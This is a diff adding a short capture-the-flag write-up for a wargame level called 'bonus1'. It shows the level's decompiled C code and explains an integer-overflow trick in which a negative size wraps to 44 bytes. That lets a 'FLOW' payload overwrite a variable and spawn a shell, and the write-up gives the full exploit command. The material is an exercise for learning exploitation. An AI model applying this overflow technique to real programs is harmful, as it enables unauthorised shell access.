@@ -1,0 +1,46 @@
+Pretty easy one, lets do it.
+
+`
+//----- (08048424) --------------------------------------------------------
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char dest[40]; // [esp+14h] [ebp-2Ch] BYREF
+  int v5; // [esp+3Ch] [ebp-4h]
+
+  v5 = atoi(argv[1]);
+  if ( v5 > 9 )
+    return 1;
+  memcpy(dest, argv[2], 4 * v5);
+  if ( v5 == 1464814662 )
+    execl("/bin/sh", "sh", 0);
+  return 0;
+}
+`
+
+This is literally all there is on the level, we have a buffer of 40 bytes, and we can write 4 * v5 bytes on it.
+-> v5 is an integer that is converted from the first argument of the program, so we can control it.
+
+The goal is to have v5 == 1464814662 to launch the shell.
+To overflow v5, we can write 44 bytes on dest to overwrite its value and make it equal to 1464814662 (0x574f4c46 in hex).
+
+We quickly saw that we could put a negative value on v5.
+And from there, we just had to find the int value that would be equal to 11 when multiplied by 4 (11*4 = 44). 
+-> since its an int, it will cycle through the positive side.
+
+So the calculation looks like that :
+-> (2147483648 + 2147483647 - 44) / 4 = 1073741812,75 (so, 1073741813 rounded up)
+
+We test it using the test_number_overflow.c program :
+`
+$ gcc test_number_overflow.c
+test_number_overflow.c:5:25: warning: overflow in expression; result is 44 with type 'int' [-Winteger-overflow]
+        printf("%d\n", (int)(4 * -1073741813));
+                               ^
+1 warning generated.
+`
+-> we then get a warning that confirms the value as correct.
+
+The exploit is then obvious :
+-> ./bonus1 -1073741813 0123456789012345678901234567890123456789FLOW
+
+"FLOW" = \x46\x4c\x4f\x57
